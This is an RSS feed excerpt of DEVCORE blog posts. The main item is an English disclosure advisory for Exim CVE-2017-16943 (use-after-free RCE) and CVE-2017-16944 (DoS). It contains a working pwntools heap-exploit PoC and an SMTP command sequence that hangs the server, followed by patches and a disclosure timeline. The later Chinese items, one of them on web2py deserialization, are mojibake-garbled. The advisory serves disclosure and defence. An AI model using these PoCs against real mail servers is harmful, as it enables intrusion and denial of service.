  &lt;li&gt;Use DATA command to send lots of data&lt;br /&gt;
 Send huge data, make the chunk big and extend many times. After several extension, it calls &lt;code class=&quot;highlighter-rouge&quot;&gt;store_get&lt;/code&gt; to retrieve a bigger store and then releases the old one. This repeats many times if the data is long enough. Therefore, we have a big chunk in unsorted bin.&lt;/li&gt;
  &lt;li&gt;End DATA transfer and start a new email&lt;br /&gt;
 Restart to send an email with BDAT command after the heap chunk is prepared.&lt;/li&gt;
  &lt;li&gt;Adjust &lt;code class=&quot;highlighter-rouge&quot;&gt;yield_length&lt;/code&gt; again&lt;br /&gt;
 Send invalid command with an unprintable charater again to cut the &lt;code class=&quot;highlighter-rouge&quot;&gt;current_block&lt;/code&gt;.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Finally the heap layout is like:&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20171211/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And now we can go back to the step 2 at the beginning and create the same situation. When &lt;code class=&quot;highlighter-rouge&quot;&gt;next-&amp;gt;text&lt;/code&gt; is freed, it goes back to unsorted bin and we are able to overwrite libc global variables again.&lt;br /&gt;
The following is the PoC for default configured exim:&lt;/p&gt;
&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# CVE-2017-16943 PoC by meh at DEVCORE
# pip install pwntools
&lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;localhost&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;25&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;EHLO test&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;250 HELP&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;MAIL FROM:&amp;lt;&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;RCPT TO:&amp;lt;meh@some.domain&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;a&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1280&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x7f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;command&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;DATA&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;itself&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;b&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x4000&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;.&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;.&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;MAIL FROM:&amp;lt;&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;RCPT TO:&amp;lt;meh@some.domain&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;a&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x3480&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x7f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;command&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;BDAT 1&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;:BDAT &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x7f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;a&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xdeadbeef&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1e00&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;A demo of our exploit is as below.&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20171211/7-demo.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
Note that we have not found a way to leak memory address and therefore we use heap spray instead. It requires another information leakage vulnerability to overcome the PIE mitigation on x86-64.&lt;/p&gt;

&lt;h1 id=&quot;incorrect-bdat-data-handling-leads-to-dos&quot;&gt;Incorrect BDAT data handling leads to DoS&lt;/h1&gt;

&lt;h3 id=&quot;vulnerability-analysis-1&quot;&gt;Vulnerability Analysis&lt;/h3&gt;
&lt;p&gt;When receiving data with BDAT command, SMTP server should not consider a single dot &lt;code class=&quot;highlighter-rouge&quot;&gt;â€˜.â€™&lt;/code&gt; in a line to be the end of message. However, we found exim does in receive_msg when parsing header. Like the following output:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;220 devco.re ESMTP Exim 4.90devstart_213-7c6ec81-XX Mon, 27 Nov 2017 16:58:20 +0800
EHLO test
250-devco.re Hello root at test
250-SIZE 52428800
250-8BITMIME
250-PIPELINING
250-AUTH PLAIN LOGIN CRAM-MD5
250-CHUNKING
250-STARTTLS
250-PRDR
250 HELP
MAIL FROM:&amp;lt;meh@some.domain&amp;gt;
250 OK
RCPT TO:&amp;lt;meh@some.domain&amp;gt;
250 Accepted
BDAT 10
.
250- 10 byte chunk, total 0
250 OK id=1eJFGW-000CB0-1R
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;As we mentioned before, exim uses function pointers to switch input source. This bug makes exim go into an incorrect state because the function pointer &lt;code class=&quot;highlighter-rouge&quot;&gt;receive_getc&lt;/code&gt; is not reset. If the next command is also a BDAT, &lt;code class=&quot;highlighter-rouge&quot;&gt;receive_getc&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;lwr_receive_getc&lt;/code&gt; become the same and an infinite loop occurs inside &lt;code class=&quot;highlighter-rouge&quot;&gt;bdat_getc&lt;/code&gt;. Program crashes due to stack exhaustion.&lt;br /&gt;
&lt;a href=&quot;https://github.com/Exim/exim/blob/e924c08b7d031b712013a7a897e2d430b302fe6c/src/src/smtp_in.c#L546&quot;&gt;smtp_in.c: 546 bdat_getc&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  if (chunking_data_left &amp;gt; 0)
    return lwr_receive_getc(chunking_data_left--);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;This is not enough to pose a threat because exim runs a fork server. After a further analysis, we made exim go into an infinite loop without crashing, using the following commands.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# CVE-2017-16944 PoC by meh at DEVCORE

EHLO localhost
MAIL FROM:&amp;lt;meh@some.domain&amp;gt;
RCPT TO:&amp;lt;meh@some.domain&amp;gt;
BDAT 100
.
MAIL FROM:&amp;lt;meh@some.domain&amp;gt;
RCPT TO:&amp;lt;meh@some.domain&amp;gt;
BDAT 0 LAST
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;This makes attackers able to launch a resource based DoS attack and then force the whole server down.&lt;/p&gt;

&lt;h2 id=&quot;fix&quot;&gt;Fix&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;Turn off Chunking option in config file:
    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;chunking_advertise_hosts =
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;Update to 4.89.1 version&lt;/li&gt;
  &lt;li&gt;Patch of CVE-2017-16943 released &lt;a href=&quot;https://git.exim.org/exim.git/commitdiff/4090d62a4b25782129cc1643596dc2f6e8f63bde&quot;&gt;here&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;Patch of CVE-2017-16944 released &lt;a href=&quot;https://git.exim.org/exim.git/commitdiff/178ecb70987f024f0e775d87c2f8b2cf587dd542&quot;&gt;here&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;timeline&quot;&gt;Timeline&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;23 November, 2017 09:40 Report to Exim Bugzilla&lt;/li&gt;
  &lt;li&gt;25 November, 2017 16:27 CVE-2017-16943 Patch released&lt;/li&gt;
  &lt;li&gt;28 November, 2017 16:27 CVE-2017-16944 Patch released&lt;/li&gt;
  &lt;li&gt;3 December, 2017 13:15 Send an advisory release notification to Exim and wait for reply until now&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;remarks&quot;&gt;Remarks&lt;/h4&gt;
&lt;p&gt;While we were trying to report these bugs to exim, we could not find any method for security report. Therefore, we followed the link on the official site for bug report and found the security option. Unexpectedly, the Bugzilla posts all bugs publicly and therefore the PoC was leaked. Exim team responded rapidly and improved their security report process by adding a notification for security reports in reaction to this.&lt;/p&gt;

&lt;h2 id=&quot;credits&quot;&gt;Credits&lt;/h2&gt;
&lt;p&gt;Vulnerabilities found by Meh, DEVCORE research team.&lt;br /&gt;
meh [at] devco [dot] re&lt;/p&gt;

&lt;h2 id=&quot;reference&quot;&gt;Reference&lt;/h2&gt;

&lt;p&gt;https://bugs.exim.org/show_bug.cgi?id=2199&lt;br /&gt;
https://bugs.exim.org/show_bug.cgi?id=2201&lt;br /&gt;
https://nvd.nist.gov/vuln/detail/CVE-2017-16943&lt;br /&gt;
https://nvd.nist.gov/vuln/detail/CVE-2017-16944&lt;br /&gt;
https://lists.exim.org/lurker/message/20171125.034842.d1d75cac.en.html&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2017/12/11/Exim-RCE-advisory-CVE-2017-16943-en/</link>
                <guid>https://devco.re/blog/2017/12/11/Exim-RCE-advisory-CVE-2017-16943-en</guid>
                <pubDate>Mon, 11 Dec 2017 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Exim RCE è³‡å®‰é€šå ± (CVE-2017-16943)</title>
                <description>&lt;h2 id=&quot;å…§å®¹&quot;&gt;å…§å®¹&lt;/h2&gt;

&lt;p&gt;2017/11/23 æˆ‘å€‘ç™¼ç¾ Unix çš„é–‹æºè»Ÿé«” EXIM å«æœ‰ Use-After-Free å¼±é»ï¼ˆCVE-2017-16943ï¼‰ä»¥åŠ Denial-of-Service å¼±é»ï¼ˆCVE-2017-16944ï¼‰ï¼Œ&lt;strong&gt;ç•¶ EXIM ç‰ˆæœ¬æ˜¯ 4.88 æˆ– 4.89 ä¸¦ä¸”æœ‰é–‹å•Ÿ chunking é¸é …ï¼ˆBDAT æŒ‡ä»¤ï¼‰æ™‚&lt;/strong&gt;ï¼Œæ”»æ“Šè€…å¯å‚³é€ç‰¹å®šå­—ä¸²çµ¦ EXIM è§¸ç™¼å¼±é»ï¼Œå¯èƒ½é€ æˆéƒµä»¶ä¼ºæœå™¨è¢«&lt;strong&gt;é ç«¯æ”»æ“Šè€…å…¥ä¾µ&lt;/strong&gt;æˆ–æ˜¯&lt;strong&gt;éƒµä»¶ä¼ºæœå™¨ç„¡æ³•ç¹¼çºŒæä¾›æœå‹™&lt;/strong&gt;ã€‚&lt;/p&gt;

&lt;p&gt;æ ¹æ“š E-Soft Inc. åœ¨ 11 æœˆæ‰€åšçš„èª¿æŸ¥ï¼Œç´„æœ‰ 57è¬å°ï¼ˆ56%ï¼‰çš„éƒµä»¶ä¼ºæœå™¨ä½¿ç”¨ EXIM è»Ÿé«”ã€‚å»ºè­° EXIM çš„ä½¿ç”¨è€…æª¢æŸ¥ç‰ˆæœ¬æ˜¯å¦ç‚º 4.88 æˆ– 4.89ï¼Œè‹¥æ˜¯ï¼Œå‰‡éœ€ä¿®æ”¹ EXIM çš„è¨­å®šï¼Œå°‡ chunking é¸é …&lt;strong&gt;é—œé–‰&lt;/strong&gt;ï¼ˆåœ¨ config è£¡å°‡ &lt;code class=&quot;highlighter-rouge&quot;&gt;chunking_advertise_hosts&lt;/code&gt; é¸é …ç•™ç©ºï¼‰ï¼Œæˆ–æ˜¯&lt;strong&gt;æ›´æ–°è‡³ 4.89.1 ç‰ˆ&lt;/strong&gt;ï¼Œä»¥é¿å…é­å—æ”»æ“Šã€‚&lt;/p&gt;

&lt;h2 id=&quot;ç´°ç¯€&quot;&gt;ç´°ç¯€&lt;/h2&gt;

&lt;p&gt;è©³ç´°çš„æŠ€è¡“ç´°ç¯€è«‹åƒé–±æˆ‘å€‘çš„ Advisoryï¼š&lt;br /&gt;
&lt;a href=&quot;https://devco.re/blog/2017/12/11/Exim-RCE-advisory-CVE-2017-16943-en/&quot;&gt;https://devco.re/blog/2017/12/11/Exim-RCE-advisory-CVE-2017-16943-en/&lt;/a&gt;&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2017/12/11/Exim-RCE-advisory-CVE-2017-16943/</link>
                <guid>https://devco.re/blog/2017/12/11/Exim-RCE-advisory-CVE-2017-16943</guid>
                <pubDate>Mon, 11 Dec 2017 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>WEB2PY ååºåˆ—åŒ–çš„å®‰å…¨å•é¡Œï¼CVE-2016-3957</title>
                <description>&lt;h3 id=&quot;å‰è¨€&quot;&gt;å‰è¨€&lt;/h3&gt;

&lt;p&gt;åœ¨ä¸€æ¬¡æ»²é€æ¸¬è©¦çš„éç¨‹ä¸­ï¼Œæˆ‘å€‘é‡åˆ°äº†ç”¨ web2py æ¡†æ¶å»ºæ§‹çš„æ‡‰ç”¨ç¨‹å¼ã€‚ç‚ºäº†æˆåŠŸæ»²é€ç›®æ¨™ï¼Œæˆ‘å€‘ç ”ç©¶äº† web2pyï¼Œç™¼ç¾è©²æ¡†æ¶ç¯„ä¾‹æ‡‰ç”¨ç¨‹å¼ä¸­å­˜åœ¨ä¸‰å€‹è³‡è¨Šæ´©æ¼å•é¡Œï¼Œé€™äº›æ´©æ¼éƒ½æœƒå°è‡´é ç«¯å‘½ä»¤åŸ·è¡Œ (RCE)ã€‚ç”±æ–¼ç¯„ä¾‹æ‡‰ç”¨ç¨‹å¼é è¨­æ˜¯é–‹å•Ÿçš„ï¼Œè‹¥æ²’æœ‰æ‰‹å‹•é—œé–‰ï¼Œæ”»æ“Šè€…å¯ä»¥ç›´æ¥åˆ©ç”¨æ´©æ¼è³‡è¨Šå–å¾—ç³»çµ±åŸ·è¡Œæ¬Šé™ã€‚é€™äº›å•é¡Œç·¨è™Ÿåˆ†åˆ¥ç‚ºï¼šCVE-2016-3952ã€CVE-2016-3953ã€CVE-2016-3954ã€CVE-2016-3957ã€‚&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;èƒŒæ™¯è€ç”Ÿå¸¸è«‡çš„-pickle-code-execution&quot;&gt;èƒŒæ™¯ï¼è€ç”Ÿå¸¸è«‡çš„ Pickle Code Execution&lt;/h3&gt;

&lt;p&gt;åœ¨ç¹¼çºŒèªªæ˜å‰å¿…é ˆè¦å…ˆèªçŸ¥ä»€éº¼æ˜¯ååºåˆ—åŒ–çš„å®‰å…¨å•é¡Œï¼Ÿååºåˆ—åŒ–çš„å®‰å…¨å•é¡Œåœ¨æœ¬è³ªä¸Šå…¶å¯¦æ˜¯ç‰©ä»¶æ³¨å…¥ï¼Œå®ƒçš„åš´é‡æ€§å–æ±ºæ–¼æ‰€æ³¨å…¥çš„ç‰©ä»¶æœ¬èº«æ˜¯å¦æœƒé€ æˆå±éšªè¡Œç‚ºï¼Œä¾‹å¦‚è®€å¯«æª”ã€‚ä¸€èˆ¬ä¾†èªªè¦é€éååºåˆ—åŒ–å»ºæ§‹ä¸€å€‹æˆåŠŸçš„æ”»æ“Šæœ‰å…©å€‹è¦é»ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;æ˜¯å¦å¯æ§åˆ¶ç›®æ¨™æ‰€è¦ååºåˆ—åŒ–çš„å­—ä¸²ã€‚&lt;/li&gt;
  &lt;li&gt;å±éšªè¡Œç‚ºåœ¨ååºåˆ—åŒ–å¾Œæ˜¯å¦æœƒè¢«åŸ·è¡Œã€‚é€™åœ¨å¯¦å‹™ä¸Šå¤§æ¦‚æœ‰ä¸‹é¢å…©ç¨®æƒ…å½¢ï¼š
    &lt;ul&gt;
      &lt;li&gt;å±éšªè¡Œç‚ºæ˜¯å¯«åœ¨é­”æ³•æ–¹æ³• (Magic Method) è£¡é¢ï¼Œä¾‹å¦‚ PHP çš„ __construct åœ¨ç‰©ä»¶ç”Ÿæˆæ™‚ä¸€å®šæœƒåŸ·è¡Œã€‚&lt;/li&gt;
      &lt;li&gt;ååºåˆ—åŒ–å¾Œè¦†è“‹æ—¢æœ‰ç‰©ä»¶ï¼Œå°è‡´æ­£å¸¸ç¨‹å¼æµç¨‹å‡ºç¾å±éšªçµæœã€‚&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ååºåˆ—åŒ–çš„å•é¡Œåœ¨æ¯å€‹ç¨‹å¼èªè¨€éƒ½æœƒç™¼ç”Ÿï¼Œä½†é€šå¸¸éœ€è¦æ­é…çœ‹ç¨‹å¼ç¢¼æ‹¼æ¹Šå‡ºå¯ä»¥ç”¨çš„æ”»æ“Šæµç¨‹ï¼Œæ¯”è¼ƒé›£åˆ©ç”¨ã€‚ä¸éï¼ŒæŸäº›å¯¦ä½œåºåˆ—åŒ–çš„å‡½å¼åº«æœƒå°‡ç¨‹å¼é‚è¼¯ä¹Ÿåºåˆ—åŒ–æˆå­—ä¸²ï¼Œå› æ­¤æ”»æ“Šè€…å¯ä»¥è‡ªå®šç¾©ç‰©ä»¶ç›´æ¥ä½¿ç”¨ï¼Œä¸å†éœ€è¦æ‹¼æ¹Šï¼Œä¾‹å¦‚ä»Šå¤©è¦æçš„ Python Pickleã€‚&lt;/p&gt;

